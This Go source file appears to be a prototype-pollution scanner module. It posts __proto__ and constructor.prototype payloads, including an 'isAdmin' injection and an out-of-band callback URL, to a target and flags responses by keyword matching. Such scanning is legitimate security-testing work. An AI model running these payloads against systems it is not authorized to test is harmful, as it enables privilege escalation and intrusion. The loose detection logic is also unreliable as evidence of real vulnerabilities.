package protopollution

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Finding struct {
	URL       string    `json:"url"`
	Type      string    `json:"type"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Severity  string    `json:"severity"`
	Confirmed bool      `json:"confirmed"`
	Timestamp time.Time `json:"timestamp"`
}

type Engine struct {
	client    *http.Client
	oobDomain string
	mu        sync.Mutex
	testState map[string]interface{}
}

func NewEngine(oobDomain string) *Engine {
	return &Engine{
		client:    &http.Client{Timeout: 15 * time.Second},
		oobDomain: oobDomain,
		testState: make(map[string]interface{}),
	}
}

func (e *Engine) TestAll(target string) ([]Finding, error) {
	var findings []Finding

	pollutionTests := []struct {
		name    string
		payload map[string]interface{}
	}{
		{
			name: "__proto__",
			payload: map[string]interface{}{
				"__proto__": map[string]interface{}{"polluted": "true"},
			},
		},
		{
			name: "constructor.prototype",
			payload: map[string]interface{}{
				"constructor": map[string]interface{}{
					"prototype": map[string]interface{}{"polluted": "true"},
				},
			},
		},
		{
			name: "Object.assign injection",
			payload: map[string]interface{}{
				"__proto__": map[string]interface{}{"isAdmin": true},
			},
		},
		{
			name: "JSON parse pollution",
			payload: map[string]interface{}{
				"__proto__": map[string]interface{}{"exec": "echo pwned"},
			},
		},
		{
			name: "query param pollution",
			payload: map[string]interface{}{
				"debug":            "true",
				"__proto__[debug]": "true",
			},
		},
	}

	for _, test := range pollutionTests {
		f, err := e.testPrototype(target, test.name, clonePayload(test.payload))
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func clonePayload(src map[string]interface{}) map[string]interface{} {
	data, err := json.Marshal(src)
	if err != nil {
		return src
	}
	var cloned map[string]interface{}
	if err := json.Unmarshal(data, &cloned); err != nil {
		return src
	}
	return cloned
}

func (e *Engine) testPrototype(target, testName string, payload map[string]interface{}) (*Finding, error) {
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", target, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ARES-PrototypePollution/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	e.mu.Lock()
	e.testState[testName] = payload
	e.mu.Unlock()

	detected := e.detectPollution(respBody, testName, payload)

	e.mu.Lock()
	delete(e.testState, testName)
	e.mu.Unlock()

	if detected {
		return &Finding{
			URL:       target,
			Type:      "prototype_pollution",
			Payload:   fmt.Sprintf("%s: [sanitized]", testName),
			Evidence:  fmt.Sprintf("Response indicates prototype pollution: %s", string(respBody)[:minInt(len(respBody), 500)]),
			Severity:  "high",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no pollution detected")
}

func (e *Engine) TestQueryParam(target string) (*Finding, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	q := u.Query()
	q.Set("__proto__[polluted]", "true")
	q.Set("constructor[prototype][polluted]", "true")
	u.RawQuery = q.Encode()

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "ARES-PrototypePollution/1.0")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	if strings.Contains(strings.ToLower(string(respBody)), "polluted") ||
		strings.Contains(strings.ToLower(string(respBody)), "prototype") {
		return &Finding{
			URL:       u.String(),
			Type:      "prototype_pollution_query",
			Payload:   "[sanitized query parameters]",
			Evidence:  string(respBody)[:minInt(len(respBody), 500)],
			Severity:  "high",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no query param pollution detected")
}

func (e *Engine) TestOOB(target string) (*Finding, error) {
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	payload := map[string]interface{}{
		"__proto__": map[string]interface{}{
			"callback": "http://" + e.oobDomain + "/polluted",
		},
	}

	clonedPayload := clonePayload(payload)
	body, err := json.Marshal(clonedPayload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal payload: %v", err)
	}
	req, err := http.NewRequest("POST", target, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return &Finding{
		URL:       target,
		Type:      "prototype_pollution_oob",
		Payload:   "[sanitized OOB payload]",
		Evidence:  fmt.Sprintf("OOB callback expected at %s", e.oobDomain),
		Severity:  "critical",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) detectPollution(respBody []byte, testName string, payload map[string]interface{}) bool {
	body := strings.ToLower(string(respBody))

	indicators := []string{
		"polluted",
		"isadmin",
		"prototype",
		"__proto__",
		"constructor",
		"error",
		"exception",
		"stack trace",
	}

	matchCount := 0
	for _, indicator := range indicators {
		if strings.Contains(body, indicator) {
			matchCount++
		}
	}

	return matchCount >= 2
}

func (e *Engine) Cleanup() {
	e.mu.Lock()
	defer e.mu.Unlock()
	for k := range e.testState {
		delete(e.testState, k)
	}
	e.testState = make(map[string]interface{})
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
